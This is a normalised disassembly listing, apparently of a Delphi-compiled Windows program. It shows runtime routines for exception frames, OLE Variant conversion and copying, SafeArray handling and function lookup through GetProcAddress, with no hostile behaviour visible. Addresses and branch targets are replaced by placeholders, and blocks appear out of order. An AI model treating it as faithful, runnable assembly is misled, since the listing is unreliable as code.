sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d27f
retn
mov eax sub_40cdc0
call sub_403c24
mov eax r-xdata
call sub_403c4c
cmp [ rw-data ] 0x0
je r-xdata
call sub_40b9c0
call sub_40bac4
call sub_40c7fc
call sub_40c394
mov eax rw-data
mov edx r-xdata
call sub_403ecc
sub_40d2b0
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40d304
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d35e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404100
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_407f1c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d365
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_40d370
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d3ca
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404100
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409258
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d3d1
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_40d3dc
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d436
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404100
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40922c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d43d
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_40d448
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d4a2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404100
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40aa70
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d4a9
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_40d4b4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d50e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404100
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409284
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d515
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_40d520
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40d58d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404100
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_408008
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d594
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
sub_40d5a0
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d600
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4091e0
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4046a4
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d607
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_40d610
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d670
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a230
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4046a4
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d677
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_40d680
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d6e4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_4080a4
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_4046a4
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d6eb
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_40d714
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40d740
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d2b0
mov eax r-xdata
call sub_40d714
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2e0
mov eax r-xdata
call sub_40d714
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2e0
mov eax r-xdata
call sub_40d714
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2ec
mov eax r-xdata
call sub_40d714
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2ec
mov eax r-xdata
call sub_40d714
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2ec
mov eax r-xdata
call sub_40d714
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2ec
mov eax r-xdata
call sub_40d714
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2ec
mov eax r-xdata
call sub_40d714
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2ec
mov eax r-xdata
call sub_40d714
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2ec
mov eax r-xdata
call sub_40d714
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2ec
mov eax r-xdata
call sub_40d714
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2ec
mov eax r-xdata
call sub_40d714
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2f8
mov eax r-xdata
call sub_40d714
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d304
mov eax r-xdata
call sub_40d714
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d370
mov eax r-xdata
call sub_40d714
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3dc
mov eax r-xdata
call sub_40d714
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d448
mov eax r-xdata
call sub_40d714
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d4b4
mov eax r-xdata
call sub_40d714
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d520
mov eax r-xdata
call sub_40d714
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d5a0
mov eax r-xdata
call sub_40d714
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d610
mov eax r-xdata
call sub_40d714
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d680
mov eax r-xdata
call sub_40d714
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40da4c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40da71
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da78
retn
sub_40dbac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_40e064
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e0ae
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e0b5
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_40e0b8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e147
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40fda8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40fda8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4038b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e14e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403e9c
retn
sub_40e154
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e19e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e1a5
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_40e1a8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e237
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40fda8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40fda8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4038b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e23e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403e9c
retn
sub_40e244
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e28e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e295
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_40e298
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40e4dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e4e4
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403e9c
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_403e9c
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
jmp r-xdata
dec eax
je r-xdata
call sub_40e064
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
jmp r-xdata
jmp r-xdata
call sub_40e154
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40aafc
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4038b4
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
jmp r-xdata
jmp r-xdata
sub_40e4f8
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e0b8
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e1a8
jmp r-xdata
jmp r-xdata
call sub_40e298
sub_40e52c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e576
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e57d
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_40e594
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40e5c4
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40e5c4
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40e620
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e4ec
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40e4ec
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40e594
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40e4ec
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40e4ec
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40e5c4
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e4ec
mov eax [ ebp - 0x314 ]
call sub_40e818
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40e79c
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40e4ec
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403e78
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_410204
test al al
je r-xdata
mov eax ebx
call sub_40e620
jmp r-xdata
push ebx
call VariantClear
call sub_40e4ec
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40e834
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40e864
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40e864
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40e8c0
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e4ec
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40e4ec
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40e818
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40e244
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40e4ec
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40e4ec
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40e834
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40e864
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e4ec
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40e4ec
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ea94
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40e79c
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40e4ec
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_403ecc
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_410204
test al al
je r-xdata
mov ecx sub_40ea8c
mov edx esi
mov eax ebx
call sub_40e8c0
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40e4ec
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40eb40
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40ea94
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40e79c
sub_40eb84
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404558
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40e4f8
pop ebx
pop ebp
retn 0x8
sub_40ebbc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404558
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40e4f8
pop ebx
pop ebp
retn 0x8
sub_40ebf4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40ecaa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404558
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40e4f8
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ecb1
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403e9c
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_404100
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407a78
